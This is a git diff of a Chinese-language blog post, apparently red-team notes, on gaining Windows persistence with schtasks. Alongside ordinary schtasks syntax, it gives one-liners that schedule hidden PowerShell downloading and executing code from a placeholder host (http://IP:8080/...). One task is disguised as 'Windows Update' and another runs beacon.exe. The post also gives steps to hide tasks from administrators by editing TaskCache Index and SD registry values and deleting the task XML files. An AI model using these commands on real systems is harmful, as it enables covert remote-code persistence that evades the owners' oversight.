@@ -8,49 +8,45 @@ tags:
   - Windows
   - Persistence
 ---
+> Persistence Schtasks
+> [schtasks create | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create)
+<!--more-->
+# Schtasks
 
-## 0x00 前言
-
-Persistence Schtasks
-
-[schtasks create | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create)
-
-## 0x01 Schtasks
-
-### 创建计划任务
+## 创建计划任务
 
 ```cmd
 schtasks /create 
 ```
 
-### 删除计划任务
+## 删除计划任务
 
 ```cmd
 schtasks /delete
 ```
 
-### 运行计划任务
+## 运行计划任务
 
 ```cmd
 schtasks /run 
 ```
 
-### 查询计划任务
+## 查询计划任务
 
 ```cmd
 schtasks /query 
 ```
 
-### 更改计划任务
+## 更改计划任务
 
 ```cmd
 schtasks /change 
 schtasks /end 
 ```
 
-## 0x02 利用方法
+# 利用方法
 
-### 创建定时计划任务
+## 创建定时计划任务
 
 + `<Task Name>`：计划任务的名称。
 
@@ -73,7 +69,7 @@ schtasks /create /tn <Task Name> /tr "<path to executable>" /sc once /st %TIME%
 schtasks /create /tn "MyTask" /tr "C:\Users\Public\Downloads\beacon.exe" /sc once /st 18:01 /sd 2023/08/21
 ~~~
 
-### 在系统空闲时运行计划任务
+## 在系统空闲时运行计划任务
 
 “空闲时”计划类型计划任务在 /i 参数指定的时间内，没有用户活动时运行。 在“空闲时”计划类型中，需要用到 /sc onidle 参数和 /i 参数。 /sd（开始日期）为可
 
@@ -88,7 +84,7 @@ schtasks /create /tn <Task Name> /tr "<path to executable>" /sc onidle /i <time>
 schtasks /create /tn MyApp /tr "c:\apps\myapp.exe" /sc onidle /i 10 
 ```
 
-### 计划运行多个程序的任务
+## 计划运行多个程序的任务
 
 每个任务仅运行一个程序。 但是，可以创建运行多个程序的批处理文件，然后计划运行批处理文件的任务
 
@@ -111,7 +107,7 @@ schtasks /create /tn <Task Name> /tr "<path to executable>" /sc onlogon
 schtasks /create /tn MyApps /tr "C:\MyApps.bat" /sc onlogon
 ```
 
-### 查询计划任务
+## 查询计划任务
 
 - `/tn <Task Name>`：仅显示指定名称的计划任务
 - `/fo <format>`：以指定格式输出结果。例如，`/fo table`以表格形式输出结果，`/fo list`以列表形式输出结果
@@ -131,7 +127,7 @@ schtasks /query /fo list
 schtasks /query /fo list /tn <Task Name>
 ~~~
 
-### 常用上线命令
+## 常用上线命令
 
 ```cmd
 #(X64) - On System Start
@@ -150,7 +146,7 @@ schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\
 schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onidle /i 30
 ```
 
-### 到期启动并删除
+## 到期启动并删除
 
 有效负载的执行也可以在特定时间发生，并且可以具有到期日期和自删除功能
 
@@ -164,7 +160,7 @@ schtasks /CREATE /TN "A" /TR "cmd.exe /c start /b <path to executable>" /SC minu
 schtasks /CREATE /TN "Windows Update" /TR "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /SC minute /MO 1 /ED 04/11/2019 /ET 06:53 /Z /IT
 ```
 
-### 日志触发计划任务
+## 日志触发计划任务
 
 如果为目标事件启用了事件日志记录，则可以在特定 Windows 事件上触发任务
 
@@ -183,11 +179,11 @@ schtasks /Create /TN OnLogOff /TR "cmd.exe /c start /b <path to executable>" /SC
 schtasks /Query /tn OnLogOff /fo List /v
 ```
 
-## 0x03 XML 文件
+# XML 文件
 
 计划任务一旦创建成功，将会自动在 `%SystemRoot%\System32\Tasks` 目录生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息
 
-## 0x04 注册表
+# 注册表
 
 在 Windows 7，计划任务注册表路径为
 
@@ -209,13 +205,13 @@ schtasks /Query /tn OnLogOff /fo List /v
 
 **Windows 7 、Windows Server 2008 无 SD 值、Windows 10 有 SD 值**
 
-## 0x05 隐藏姿势
+# 隐藏姿势
 
-### 非完全隐藏
+## 非完全隐藏
 
 非完全隐藏一个计划任务，通过修改 `\Schedule\TaskCache\Tree` 下对应任务的 Index 值，一般情况下值为 3 。
 
-#### Index 修改
+### Index 修改
 
 - 修改 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}` 下对应任务的 Index 值为 0
 
@@ -225,7 +221,7 @@ schtasks /Query /tn OnLogOff /fo List /v
 + 当 Index 修改为 0 后， 利用 `taskschd.msc`、`schtasks.exe` 、甚至系统API查询出的所有任务中，都查看不到所创建的任务。但如果知道该任务名称，可以通过 `schtasks /query /tn {TaskName Path}` 查到
 + 但在 Windows Server 2008 与 Windows 7 中，修改 Index 键值为 0 ，任务计划程序中仍存在该任务，原因未知
 
-#### XML 文件删除
+### XML 文件删除
 
 - 删除 `%SystemRoot%\System32\Tasks` 下任务对应的 XML 文件
 
@@ -236,9 +232,9 @@ del /f /s /q %SystemRoot%\System32\Tasks\<Filename>
 1. 在 Windows 10 中，删除 XML 文件，并不影响计划任务的运行，且在 `taskschd.msc` 任务计划程序中，依然存在对应任务
 2. 在 Windows 7 与 Windows Server 2008 中，若删除 XML 文件，任务计划程序中的对应任务也会被删除，并且影响计划任务的运行，但注册表中项值依然存在
 
-### 完全隐藏
+## 完全隐藏
 
-#### SD 删除
+### SD 删除
 
 - 删除 `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD`
 - 删除 `%SystemRoot%\System32\Tasks` 下任务对应的 XML 文件
